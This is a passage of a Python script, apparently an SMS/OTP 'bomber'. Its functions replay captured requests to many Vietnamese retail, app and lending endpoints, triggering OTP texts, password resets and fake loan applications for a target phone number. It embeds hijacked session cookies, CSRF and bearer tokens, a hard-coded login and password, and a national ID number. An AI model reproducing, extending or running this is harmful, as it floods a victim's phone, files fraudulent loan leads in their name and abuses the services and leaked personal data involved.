        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "phone": phone,
    }
    response = requests.post(
        "https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_hopiness(phone):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "DNT": "1",
        "Origin": "https://shopiness.vn",
        "Referer": "https://shopiness.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "action": "verify-registration-info",
        "phoneNumber": phone,
        "refCode": "",
    }
    response = requests.post(
        "https://shopiness.vn/ajax/user", headers=headers, data=data
    )
def call_modcha35(phone):
    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"
    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={phone}&version=1.28"
    headers = {
        "User-Agent": "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
        "Content-Type": "application/x-www-form-urlencoded",
        "uuid": "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
        "APPNAME": "MC35",
        "mocha-api": "",
        "countryCode": "VN",
        "languageCode": "vi",
        "Accept-Language": "vi-VN;q=1",
    }
    response = requests.post(url, data=payload, headers=headers)
def call_Bibabo(phone):
    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"
    params = {"phone": phone, "reCaptchaToken": "undefined", "appId": "7", "version": "2"}
    headers = {
        "User-Agent": "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
        "Accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    response = requests.get(url, params=params, headers=headers)
def call_MOCA(phone):
    url = "https://moca.vn/moca/v2/users/role"
    params = {"phoneNumber": phone}
    headers = {
        "User-Agent": "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
        "digest": "SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=",
        "x-mof-ods": "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
        "x-mof-ds": "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
        "device-token": "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
        "x-requested-with": "XMLHttpRequest",
        "device-id": "b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1",
        "accept-language": "vi",
        "x-moca-api-version": "2",
        "platform": "P_IOS-2.10.156",
        "date": "Thu, 01 Aug 2024 13:15:05 GMT",
        "x-request-id": "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269",
        "pre-authorization": 'hmac username="06b707de-6050-11eb-ae93-0242ac130002", algorithm="hmac-sha256", headers="date digest", signature="cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw="',
    }
    response = requests.get(url, params=params, headers=headers)
def call_pantio(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "origin": "https://pantio.vn",
        "priority": "u=1, i",
        "referer": "https://pantio.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    params = {
        "domain": "pantiofashion.myharavan.com",
    }
    data = {
        "phoneNumber": phone,
    }
    response = requests.post(
        "https://api.suplo.vn/v1/auth/customer/otp/sms/generate",
        params=params,
        headers=headers,
        data=data,
    )
def call_Routine(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "dnt": "1",
        "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==",
        "origin": "https://routine.vn",
        "priority": "u=1, i",
        "referer": "https://routine.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "traceparent": "00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01",
        "tracestate": "4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "x-newrelic-id": "UAQGVlBbDBABVFZSBAkBVVcF",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "telephone": phone,
        "isForgotPassword": "0",
    }
    response = requests.post(
        "https://routine.vn/customer/otp/send/", headers=headers, data=data
    )
def call_vayvnd(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    headers = {
        "accept": "application/json",
        "accept-language": "vi-VN",
        "content-type": "application/json; charset=utf-8",
        "dnt": "1",
        "origin": "https://vayvnd.vn",
        "priority": "u=1, i",
        "referer": "https://vayvnd.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "site-id": "3",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data_1 = {
        "phone": phone,
        "utm": [
            {
                "utm_source": "leadbit",
                "utm_medium": "cpa",
            },
        ],
        "cpaId": 2,
        "cpaLeadData": {
            "click_id": "66A8D2827EED7B49190B756A",
            "utm_campaign": "44559",
        },
        "sourceSite": 3,
        "regScreenResolution": {
            "width": 1920,
            "height": 1080,
        },
        "trackingId": "Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2",
    }
    response_1 = requests.post(
        "https://api.vayvnd.vn/v2/users", headers=headers, json=json_data_1
    )
    json_data_2 = {
        "login": phone,
        "trackingId": "Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2",
    }
    response_2 = requests.post(
        "https://api.vayvnd.vn/v2/users/password-reset",
        headers=headers,
        json=json_data_2,
    )
    json_data_3 = {
        "login": phone,
        "trackingId": "Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2",
        "antispamCheckData": {
            "hostname": "vayvnd.vn",
            "recaptchaResponse": "03AFcWeA4a3of5F2rQflfDDN3PoKGexeshUPBijwHLLt_g5MKfy8DOVF7AtAdhNcRg0tk8OxQFZMluITyXgxDF56auNDfD2IqOBzc_0YEQKhjz28R_3Cv7da1x3t73L6y1uGHmh_vbGE4nwjMo6uqQD_4XaGXbrjK3A_MECVrnlxqSzdcFHT_dWY8dZY_XZrVZD8qAaRrxewtpoGroniGyrMXDQBqvpO8cv5NHF6HzebGbHr9pcFdjurawUgyfpvJaIf818dt0Fl71g6BYQ2PDWk81ZI7m6Zz2sIcb_RINTz4VPgnKHO2EYvhnMkxdVHf5H2u5sV1eJuQ-Ess3AgShIQXTbUhorpjz9CDlnKfwcMtQmV47LB_wrJIhkGAyjO2s4Uadi_DJaoqQuk5KzpgWbG0v7hVWoL_FtCxdRioMgrj4zMMGHGUGjsaHUw5f1FJ5ehwPX3BbfFDxgv6G-LAhPOJ6D7QtWP_2K-1Di2Y-DMBiM15k4sr9-jQq7Hb6i44Df3m0Pe4sF8w4DD6rCrj7qMhQFhz-FxTCMyKg1AZttUoWVYEpkuEudROLWWBoATDsLwdO1ICLaEGeA9V0dRfcFYNm1bpF8AC7Iuya-df_55Uvb3UP1bGDNEvkTPXZIN8gFosYfWFTOt6JbTdWBM11vNT1YzC9rAIsrgCG3FShXF_6dy7_uxJ9v2gykpQ6bHe9EMJEK9xsQn50kOTTXOLJPXxOdplk4LdQfVzgkWsMnGPhbtK5n5E8hFHz--vQy61eAHHJ0gxs1ybOgFpEn53BDkKWXyOrOvvEDDdffBhwwDcl1C5zKRN1-_gYLfgEMI8Hxmq7AWfF_kQ6eOPq2DM5JY01v4nuLj06s-RQwyKO_R1q6IS5LvWek425nDxjt7ihJLbfUotuMCWDvnBm_pSm05pTm8WL6twt9vLd_K4BB-ME-5DFAHbmopkZj6rGQhXGLMWEU-rvgOG-qgZ1_VE_0-j254Sw19qZcz_bdUGXxeblMoWThlaMf8OQT5s9O1enSYTPWCtMhWsgDT5Crb2xMGHWkO5nbC0X2KOT-uNWNIMldpA3DSs4jTSecEhZW2NPAjygBqSs4ZsllUOl8gaq5hv352ysq6T6nFs_fpoBhCNnhNQR0_G3Qw80ZS7cfC1YlCoDAItOd9AgD0oWsvjV9gUkSz9WgmkCL0vxnndR2ixnyolsRZqMxT7Q8RirZZU-plNUDW0Tj7cfkGPib4MFZ5P3J08LPP1uSeuctw4HXSRheltiEvu5IFZ4UExasH5yMbyTBYSrAMw9IlO3s8KnNu9UQMX9pOzjo8wXdS4QiSoOo0PjQ4RV881eL6ojJv-py9IVmezFvPohm9JmcFRgzuXWnv5WpXyclW1AhTHjGc19emxXc92q2fnqouvYr3-cgQtFyHJInovng8kmUBa-d8mSuT-36a6LaiqKLi-cw0sCVXHmOdXnULf7DMh48AD6VLDw49jwYeczc3K3WJDz0cWJDPZwen8GmC-uuhIGi1hER1q6Mfq01GCKs2lLwbmCysD9xURNFGXu9NUjHoE0J6QHlxdq95scnOone1SIivS0Y9OlK192g_C_c26g-7-aMft1_QQ4pb7r7asb-yHglSBAdL3DMHk4ig2qMf5bMX2Z01GDbt6pAC0UIjtsuSI0zwNQiyWV6rePlXp9_5n0VZD2svaUel7KnIv6SFyrwo2kk1Y1iaahtbk6rIWYW-oYcU4Xo67PzkSkd5o2BdVbMNoqyoE3_64SdGbCJhpMixqxBJTKVqeKn0ohM1H7m8RDs-ECaAfEHO8j96z1E1P2m0HVO5zJNB-8WnIEW3gJ1X5OjymNfqrMNr94626PA04O9_-NPTwuKFmIJZE2aEtItXRBvXR1GUZBdpH32PrECRp8Mo-sOz1W7UBwkvAfaOvYDn3zJ-k54emVQ4bf-vEpvDLYKtffIHmy1dcSMP8vhJJgykim-fxJ8cEYYKpRxWrE9CiobKH78pDTEIWIj8GzCkxrqbe4ycj5kA",
        },
    }
    response_3 = requests.post(
        "https://api.vayvnd.vn/v2/users/password-reset",
        headers=headers,
        json=json_data_3,
    )
def call_tima(phone):
    cookies = {
        "ASP.NET_SessionId": "m1ooydpmdnksdwkm4lkadk4p",
        "UrlSourceTima_V3": '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
        "tkld": "b460087b-2c70-9d44-da8d-68d0d4c00f3a",
        "tbllender": "tbllender",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://tima.vn",
        "priority": "u=0, i",
        "referer": "https://tima.vn/vay-tien-online/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "application_full_name": generate_random_name(),
        "application_mobile_phone": phone,
        "CityId": "1",
        "DistrictId": "16",
        "rules": "true",
        "TypeTime": "1",
        "application_amount": "0",
        "application_term": "0",
        "UsertAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "IsApply": "1",
        "ProvinceName": "Thành phố Hà Nội",
        "DistrictName": "Huyện Sóc Sơn",
        "product_id": "2",
    }
    response = requests.post(
        "https://tima.vn/Borrower/RegisterLoanCreditFast",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_moneygo(phone):
    cookies = {
        "XSRF-TOKEN": "eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D",
        "laravel_session": "eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://moneygo.vn",
        "priority": "u=0, i",
        "referer": "https://moneygo.vn/",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_token": "X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV",
        "total": "56688000",
        "phone": phone,
        "agree": "1",
    }
    response = requests.post(
        "https://moneygo.vn/dang-ki-vay-nhanh",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_pico(phone):
    headers_1 = {
        "accept": "*/*",
        "accept-language": "vi",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://pico.vn",
        "priority": "u=1, i",
        "referer": "https://pico.vn/",
        "region-code": "MB",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    json_data_1 = {
        "name": generate_random_name(),
        "phone": phone,
        "provinceCode": "92",
        "districtCode": "925",
        "wardCode": "31261",
        "address": "123",
    }
    response_1 = requests.post(
        "https://auth.pico.vn/user/api/auth/register",
        headers=headers_1,
        json=json_data_1,
    )
    headers_2 = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi",
        "access": "206f5b6838b4e357e98bf68dbb8cdea5",
        "channel": "b2c",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://pico.vn",
        "party": "ecom",
        "platform": "Desktop",
        "priority": "u=1, i",
        "referer": "https://pico.vn/",
        "region-code": "MB",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "uuid": "cc31d0b5815a483b92f547ab8438da53",
    }
    json_data_2 = {
        "phone": phone,
    }
    response_2 = requests.post(
        "https://auth.pico.vn/user/api/auth/login/request-otp",
        headers=headers_2,
        json=json_data_2,
    )
def call_PNJ(phone):
    cookies = {
        "CDPI_VISITOR_ID": "78166678-ea1e-47ae-9e12-145c5a5fafc4",
        "CDPI_RETURN": "New",
        "CDPI_SESSION_ID": "f3a5c6c7-2ef6-4d19-a792-5e3c0410677f",
        "XSRF-TOKEN": "eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D",
        "mypnj_session": "eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://www.pnj.com.vn",
        "priority": "u=0, i",
        "referer": "https://www.pnj.com.vn/customer/login",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_method": "POST",
        "_token": "0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU",
        "type": "zns",
        "phone": phone,
    }
    response = requests.post(
        "https://www.pnj.com.vn/customer/otp/request",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_TINIWORLD(phone):
    cookies = {
        "connect.sid": "s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU",
    }
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "dnt": "1",
        "origin": "https://prod-tini-id.nkidworks.com",
        "priority": "u=0, i",
        "referer": "https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    }
    data = {
        "_csrf": "",
        "clientId": "609168b9f8d5275ea1e262d6",
        "redirectUrl": "https://tiniworld.com",
        "phone": phone,
    }
    response = requests.post(
        "https://prod-tini-id.nkidworks.com/auth/tinizen",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def call_BACHHOAXANH(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Access-Control-Allow-Origin": "*",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DNT": "1",
        "Origin": "https://www.bachhoaxanh.com",
        "Referer": "https://www.bachhoaxanh.com/dang-nhap",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "authorization": "Bearer 48AEFAE5FF6C90A31EBC7BB892756688",
        "deviceid": "1c4323a6-32d4-4ce5-9081-b5a4655ba7e6",
        "platform": "webnew",
        "referer-url": "https://www.bachhoaxanh.com/dang-nhap",
        "reversehost": "http://bhxapi.live",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "xapikey": "bhx-api-core-2022",
    }
    json_data = {
        "deviceId": "1c4323a6-32d4-4ce5-9081-b5a4655ba7e6",
        "userName": phone,
        "isOnlySms": 1,
        "ip": "",
    }
    response = requests.post(
        "https://apibhx.tgdd.vn/User/LoginWithPassword",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_shbfinance(phone):
    headers = {
        "Accept": "application/json",
        "Accept-Language": "vi,en-US;q=0.9,en;q=0.8",
        "Authorization": "Bearer",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "DNT": "1",
        "Origin": "https://www.shbfinance.com.vn",
        "Referer": "https://www.shbfinance.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {
        "customerName": generate_random_name(),
        "mobileNumber": phone,
        "campaignCode": "",
        "documentIds": "Cash",
        "year": 1996,
        "provinceName": "An Giang",
        "districtName": "Châu Đốc",
        "district": None,
        "document": "Vay tiền mặt",
        "lendingAmt": 40000000,
        "loanAmt": 40000000,
        "lendingPeriod": 12,
        "dateOfBirth": "01-Jan-1996",
        "partnerName": "Website",
        "utmSource": "WEB",
        "utmMedium": "form",
        "utmCampaign": "vay-tien-mat",
    }
    response = requests.post(
        "https://customer-app-nred.shbfinance.com.vn/api/web/SubmitLoan",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def call_mafccomvn(phone):
    cookies = {
        "pll_language": "vi",
        "BIGipServerPool_www.mafc.com.vn": "654334730.20480.0000",
        "mafcavraaaaaaaaaaaaaaaa_session_": "BOHBOMAPPPCOMKFPMBDFGDKHMLOJBNAGGGJLKOHELAEOACOEOOPLCKEMKDFMAPDGIOODBMJAMIMBGNFKCCDAFABCFAAIAMONKAHEOOIKOMIPOGDMKFHNPLJKOOHONLEB",
        "MAFC01f6952f": "018fd3cf680ed5f9ed9f2546edbe4214c6c1d1c24f980b9654ff43d962a4d45ed15fb96ee094bb83a9588a303cba75f8db9042279ac6bca62d751af525b2ef57f146709597d08b14f2fc4d49b046c36fa46b82805b1c7712182214182103581f9f2e641831f6688f99544fe20f2b11df2fc5c814ed",
        "MAFC00000000233": "0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c809d000a5ac08535dd51358f6197f3c8335839ea69aae4e9f16840f082b2a0c607cce8305351e49d64a43551e9c9ea86ec6e19e01d85d7a1d507070a8ba8f6f66efaa19a8b4497bbb9b04ba689334a46a1a9eb7c3b58965523e2fb3a5878e3ba7498457f71c7a4c169987c88f53186e5846a80a1bbc7c75fa811b521de665aa27e95c9915844bc2b6116c415293b95050601fc9e5b3b0bd3449f6d074fb6a454aa30267f82c9d1520fdb3112fa12796766fc3eff654bc9f9829b8f70d713c6a744053d806410b846a2c9f568ca3d773e4d91bec",
        "MAFC_101_DID": "0850209877ab2800359aa259a3e967ad4cadfc21e816fad5a0d1b1d90c52fabddaf256eceaa66ba8850711bba3c09b25084a2ae3c8063800f8d5e8ee925ae9ecf081258c38f27590e9879625c7624c6033304425b50ad0443a41fabf9652f15fc34d093f802fe31082aa893b4c121ec9",
        "MAFCed66693a184": "0850209877ab2000035bb49d85d36c1714180eb222a6a5c6b20c2e3328516f0da52a6fabdd5acf9e081c5884c8113000a63479a1b533672c96c6790276b673af3e57c251be970cc54abb2a88d001192bb815cb83ac72e7084a193babac4e2f33",
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "dnt": "1",
        "origin": "https://mafc.com.vn",
        "priority": "u=1, i",
        "referer": "https://mafc.com.vn/vay-tien-nhanh",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0",
    }
    json_data = {
        "usersName": "tannguyen",
        "password": "mafc123!",
        "income": 0,
        "currAddress": "Tp.Hcm",
        "phoneNbr": phone,
        "nationalId": "034201009872",
        "typeCreate": "API",
        "name": generate_random_name(),
        "allowQualified": "Y",
        "email": "b45b93f099",
        "referralCode": "",
        "age": "1992",
        "vendorCode": "INTERNAL_MKT",
        "msgName": "creatlead",
        "priAddress": "null",
        "campaign": "null",
        "adsGroupName": "null",
        "adsName": "null",
        "paramInfo": "",
        "mktCode": "null",
        "consentNd13": "Y",
    }
    response = requests.post(
        "https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php",
        cookies=cookies,
